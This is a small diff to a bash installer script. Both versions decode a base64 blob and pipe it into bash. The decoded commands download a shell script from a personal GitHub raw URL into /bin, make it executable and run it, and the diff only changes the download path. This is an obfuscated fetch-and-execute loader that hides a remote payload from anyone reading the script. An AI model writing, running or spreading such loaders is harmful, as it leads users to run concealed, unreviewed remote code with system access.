@@ -1,6 +1,6 @@
 #!/bin/bash
-echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcmF3LmdpdGh1YnVz
-ZXJjb250ZW50LmNvbS9JZ29yaGVucmkwNDA3L2luc3RhbGwvYmFkL3VidWluc3QyLn
-NoICYmIGNobW9kICt4IHVidWluc3QyLnNoICYmIGRvczJ1bml4IHVidWluc3Quc2gg
-PiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0' | base64 -d | bash
+echo 'IyEvYmluL2Jhc2gKY2QgL2JpbiB8fCBleGl0CndnZXQgcm
+F3LmdpdGh1YnVzZXJjb250ZW50LmNvbS9JZ29yaGVucmkwNDA3L3B3ZWI
+vcGFpbmVsL2luc3RhbGwvdWJ1aW5zdC5zaCAmJiBjaG1vZCAreCB1YnVpbnN0LnNoICYmIGRvczJ1bml4I
+HVidWluc3Quc2ggPiAvZGV2L251bGwgMj4mMQpjZCB8fCBleGl0' | base64 -d | bash
 /bin/ubuinst.sh
